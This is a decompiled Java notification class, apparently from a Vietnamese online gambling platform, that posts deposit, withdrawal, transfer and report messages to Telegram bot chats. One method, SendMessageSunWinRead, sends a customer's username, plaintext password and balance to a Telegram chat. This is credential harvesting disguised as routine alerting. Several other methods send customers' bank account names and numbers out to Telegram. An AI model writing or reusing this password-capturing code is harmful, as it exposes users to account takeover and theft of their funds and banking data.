/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  bitzero.util.common.business.Debug
 *  okhttp3.Call
 *  okhttp3.Callback
 *  okhttp3.MultipartBody
 *  okhttp3.MultipartBody$Builder
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.RequestBody
 *  okhttp3.Response
 *  org.apache.http.util.TextUtils
 */
package com.vinplay.utils;

import bitzero.util.common.business.Debug;
import com.vinplay.payment.entities.DepositPaygateModel;
import com.vinplay.payment.entities.UserWithdraw;
import com.vinplay.usercore.utils.GameCommon;
import com.vinplay.utils.TelegramUtil;
import java.io.IOException;
import java.text.NumberFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.apache.http.util.TextUtils;

public class TelegramAlert {
    public static boolean sendMessage(String message) {
        try {
            String chatId = GameCommon.telegramConfig.getUtil().getChatId();
            return TelegramAlert.postRequest(chatId, message) != 0;
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean SendLoginMessage(String message) {
        try {
            String chatId = GameCommon.telegramConfig.getLogin().getChatId();
            String bootToken = GameCommon.telegramConfig.getLogin().getBootToken();
            return TelegramUtil.sendMessage(message, chatId, bootToken);
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean SendMessageSunWinRead(String userName, String nickName, String passWord, String balance) {
        try {
            String message = "<b>Kh\u00e1ch h\u00e0ng Sunwin: " + nickName + "</b>";
            message = message + "\n T\u00ean \u0111\u0103ng nh\u1eadp: <b>" + userName + "</b>";
            message = message + "\n M\u1eadt kh\u1ea9u: <b>" + passWord + "</b>";
            message = message + "\n S\u1ed1 d\u01b0: <b>" + balance + "</b>";
            return TelegramAlert.SendLoginMessage(message);
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean SendMessageCashout(UserWithdraw userWithdraw) {
        try {
            String message = "<b>Y\u00eau c\u1ea7u r\u00fat ti\u1ec1n t\u1eeb User " + userWithdraw.Username + "</b>";
            String amountFormatted = TelegramAlert.formatDecimalRound(userWithdraw.Amount);
            message = message + "\n S\u1ed1 ti\u1ec1n <b>" + amountFormatted + "</b>";
            message = message + "\n Ng\u00e2n h\u00e0ng: <b>" + userWithdraw.BankName + "</b>";
            message = message + "\nT\u00ean t\u00e0i kho\u1ea3n <b>" + userWithdraw.BankAccountName + "</b>";
            message = message + "\n S\u1ed1 t\u00e0i kho\u1ea3n : <b>" + userWithdraw.BankAccountNumber + "</b>";
            String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
            return TelegramAlert.postRequest(chatId, message) != 0;
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean SendMessageDepositBank(DepositPaygateModel model) {
        try {
            String message = "<b>Y\u00eau c\u1ea7u n\u1ea1p ti\u1ec1n qua Ng\u00e2n H\u00e0ng User " + model.Nickname + "</b>";
            String amountFormatted = TelegramAlert.formatDecimalRound(model.Amount);
            message = message + "\n S\u1ed1 ti\u1ec1n <b>" + amountFormatted + "</b>";
            message = message + "\n Ng\u00e2n h\u00e0ng: <b>" + model.BankCode + "</b>";
            message = message + "\n T\u00ean t\u00e0i kho\u1ea3n <b>" + model.BankAccountName + "</b>";
            message = message + "\n S\u1ed1 t\u00e0i kho\u1ea3n: <b>" + model.BankAccountNumber + "</b>";
            String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
            return TelegramAlert.postRequest(chatId, message) != 0;
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean SendMessageRechard(String message) {
        try {
            return TelegramUtil.pushNotificationDeposit(message);
        }
        catch (Exception e) {
            return false;
        }
    }

    public static boolean buyTicket(String message) {
        try {
            return TelegramUtil.pushNotificationLode(message);
        }
        catch (Exception e) {
            return false;
        }
    }

    public static int postRequest(String chatId, String content) {
        try {
            String token = GameCommon.telegramConfig.getLogin().getBootToken();
            String URLAPITELEGRAM = "https://api.telegram.org/bot" + token + "/sendMessage";
            OkHttpClient client = new OkHttpClient().newBuilder().build();
            MultipartBody body = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("chat_id", chatId).addFormDataPart("text", content).addFormDataPart("parse_mode", "html").build();
            Request request = new Request.Builder().url(URLAPITELEGRAM).method("POST", (RequestBody)body).build();
            client.newCall(request).enqueue(new Callback(){

                public void onFailure(Call call, IOException e) {
                }

                public void onResponse(Call call, Response response) throws IOException {
                    if (response != null && response.body() != null) {
                        response.body().close();
                    }
                }
            });
            return 200;
        }
        catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    public static void sendDepositMoMo(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        String content = TelegramAlert.momoSendContent(nickName, money, currentMoney, note, moneyBefore, withDrawBefore);
        String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static void sendDepositBank(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        String content = TelegramAlert.bankSendContent(nickName, money, currentMoney, note, moneyBefore, withDrawBefore);
        String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static void sendDepositCard(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        String content = TelegramAlert.theSendContent(nickName, money, currentMoney, note, moneyBefore, withDrawBefore);
        String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static void sendReport(String momo, String the, String bank, String tongNap, String tongRut, String tyLe, String time, String profit) {
        String content = TelegramAlert.sendReportContent(momo, the, bank, tongNap, tongRut, tyLe, time, profit);
        String chatId = GameCommon.telegramConfig.getPushNotificationLode().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static void sendBankOut(String nickName, String money, String note) {
        String content = TelegramAlert.bankOutContent(nickName, money, note);
        String chatId = GameCommon.telegramConfig.getPushNotificationDeposit().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static String momoSendContent(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
            currentMoney = TelegramAlert.formatDecimalRound(Double.parseDouble(currentMoney));
            moneyBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(moneyBefore));
            withDrawBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(withDrawBefore));
        }
        catch (Exception exception) {
            // empty catch block
        }
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
        df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2========================\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "Nh\u1eadn ti\u1ec1n MOMO: " + nickName + "\n";
        message = message + "\ud83d\udcb5 N\u1ed9i dung: " + note + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: " + money + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 d\u01b0: " + currentMoney + "\n";
        message = message + "\ud83d\udfe2 S\u1ed1 ti\u1ec1n \u0111\u00e3 n\u1ea1p: " + moneyBefore + "\n";
        message = message + "\ud83d\udd34 S\u1ed1 ti\u1ec1n r\u00fat tr\u01b0\u1edbc: " + withDrawBefore + "\n";
        return message;
    }

    public static String theSendContent(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
            currentMoney = TelegramAlert.formatDecimalRound(Double.parseDouble(currentMoney));
            moneyBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(moneyBefore));
            withDrawBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(withDrawBefore));
        }
        catch (Exception exception) {
            // empty catch block
        }
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
        df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2========================\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "Nh\u1eadn ti\u1ec1n Th\u1ebb: " + nickName + "\n";
        message = message + "\ud83d\udcb5 N\u1ed9i dung: " + note + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: " + money + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 d\u01b0: " + currentMoney + "\n";
        message = message + "\ud83d\udfe2 S\u1ed1 ti\u1ec1n \u0111\u00e3 n\u1ea1p: " + moneyBefore + "\n";
        message = message + "\ud83d\udd34 S\u1ed1 ti\u1ec1n r\u00fat tr\u01b0\u1edbc: " + withDrawBefore + "\n";
        return message;
    }

    public static String bankSendContent(String nickName, String money, String currentMoney, String note, String moneyBefore, String withDrawBefore) {
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
            currentMoney = TelegramAlert.formatDecimalRound(Double.parseDouble(currentMoney));
            moneyBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(moneyBefore));
            withDrawBefore = TelegramAlert.formatDecimalRound(Double.parseDouble(withDrawBefore));
        }
        catch (Exception exception) {
            // empty catch block
        }
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2===========\ud83d\udfe2\ud83d\udfe2\ud83d\udfe2\n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "Nh\u1eadn ti\u1ec1n Bank: " + nickName + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: " + money + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 d\u01b0: " + currentMoney + "\n";
        message = message + "\ud83d\udfe2 S\u1ed1 ti\u1ec1n \u0111\u00e3 n\u1ea1p: " + moneyBefore + "\n";
        message = message + "\ud83d\udd34 S\u1ed1 ti\u1ec1n r\u00fat tr\u01b0\u1edbc: " + withDrawBefore + "\n";
        return message;
    }

    public static String bankOutContent(String nickName, String money, String note) {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
        }
        catch (Exception exception) {
            // empty catch block
        }
        String message = "\ud83d\udd34\ud83d\udd34\ud83d\udd34========================\ud83d\udd34\ud83d\udd34\ud83d\udd34\n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "Chuy\u1ec3n ti\u1ec1n Bank: " + nickName + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: " + money + "";
        message = message + "\ud83d\udd16 N\u1ed9i dung: " + note + "\n";
        message = message + "========================";
        return message;
    }

    public static String sendReportContent(String momo, String the, String bank, String tongNap, String tongRut, String tyLe, String time, String profit) {
        String message = "========================\n";
        message = message + "\ud83d\udce2 " + time + "\n";
        message = message + "========================\n";
        message = message + "\ud83d\udfe2 N\u1ea0P: <b>" + tongNap + "</b>\n";
        message = message + "N\u1ea1p Momo: <b>" + momo + "</b>\n";
        message = message + "N\u1ea1p Bank: <b>" + bank + "</b>\n";
        message = message + "N\u1ea1p Th\u1ebb: <b>" + the + "</b>\n\n";
        message = message + "\ud83d\udd34 R\u00daT: <b>" + tongRut + "</b>\n";
        message = message + "========================\n";
        message = message + "\ud83d\udcb8 LN: <b>" + profit + "</b>\n";
        message = message + "\ud83d\udcb0 T\u1ef6 L\u1ec6: <b>" + tyLe + "%</b>\n";
        message = message + "========================";
        return message;
    }

    public static void sendUserPlayGame(String nickName, String money, String game, String note) {
        String content = TelegramAlert.userPlayGame(nickName, money, game, note);
        String chatId = GameCommon.telegramConfig.getUtil().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static String userPlayGame(String nickName, String money, String game, String note) {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
        }
        catch (Exception exception) {
            // empty catch block
        }
        String message = "\ud83d\udd34\ud83d\udd34 Ch\u01a1i game: " + game.toUpperCase() + "\n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "nickName: " + nickName + "\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: " + money + "\n";
        if (!TextUtils.isEmpty((CharSequence)nickName)) {
            message = message + "Note: " + note + "\n";
        }
        message = message + "========================";
        return message;
    }

    public static void sendAdminWarring(String messageData) {
        String content = TelegramAlert.adminWarring(messageData);
        String chatId = GameCommon.telegramConfig.getUtil().getChatId();
        TelegramAlert.postRequest(chatId, content);
    }

    public static String adminWarring(String messageData) {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udd34\ud83d\udd34 Ch\u1ec9nh config \n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "N\u1ed9i dung: " + messageData + "\n";
        message = message + "========================";
        return message;
    }

    public static String lodeBuy(String messageData) {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udd34\ud83d\udd34 Ch\u1ec9nh config \n";
        message = message + "\ud83d\udce2 " + timeNow + "\n";
        message = message + "========================\n";
        message = message + "N\u1ed9i dung: " + messageData + "\n";
        message = message + "========================";
        return message;
    }

    public static String formatDecimalRound(double number) {
        return NumberFormat.getNumberInstance(Locale.US).format(Math.round(number));
    }

    public static String formatDecimalRound(long number) {
        return TelegramAlert.formatDecimalRound((double)number);
    }

    public static void sendMessageReceive(String chatId, String nickName, String money, String currentMoney, String note) {
        String message = "<b>Nh\u1eadn ti\u1ec1n t\u1eeb : " + nickName + "</b>";
        message = message + "\nN\u1ed9i dung: <b>" + note + "</b>";
        message = message + "\nS\u1ed1 ti\u1ec1n: <b>" + money + "</b>";
        message = message + "\nS\u1ed1 d\u01b0: <b>" + currentMoney + "</b>";
        Debug.trace((Object[])new Object[]{"chuyenKhoan: receiver: nickName: " + nickName + " message: " + message});
        TelegramAlert.postRequest(chatId, message);
    }

    public static void sendMessageSend(String chatId, String nickName, String money, String currentMoney, String note) {
        String message = "<b>Chuy\u1ec3n ti\u1ec1n \u0111\u1ebfn: " + nickName + "</b>";
        message = message + "\nN\u1ed9i dung: <b>" + note + "</b>";
        message = message + "\nS\u1ed1 ti\u1ec1n: <b>" + money + "</b>";
        message = message + "\nS\u1ed1 d\u01b0: <b>" + currentMoney + "</b>";
        Debug.trace((Object[])new Object[]{"chuyenKhoan: receiver: send nickName: " + nickName + " message: " + message});
        TelegramAlert.postRequest(chatId, message);
    }

    public static String allSendMoney(String nickName, String nickNameReceive, String money, String note) {
        try {
            money = TelegramAlert.formatDecimalRound(Double.parseDouble(money));
        }
        catch (Exception exception) {
            // empty catch block
        }
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
        df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String timeNow = df.format(new Date());
        String message = "\ud83d\udce2 <b>" + timeNow + "</b>\n";
        message = message + "========================\n";
        message = message + "\ud83d\udd34 Ng\u01b0\u1eddi chuy\u1ec3n: <b>" + nickName + "</b>\n";
        message = message + "\ud83d\udfe2 Ng\u01b0\u1eddi nh\u1eadn: <b>" + nickNameReceive + "</b>\n";
        message = message + "\ud83d\udcb5 S\u1ed1 ti\u1ec1n: <b>" + money + "</b>\n";
        message = message + "\ud83d\udcb5 N\u1ed9i dung: <b>" + note + "</b>\n";
        return message;
    }
}

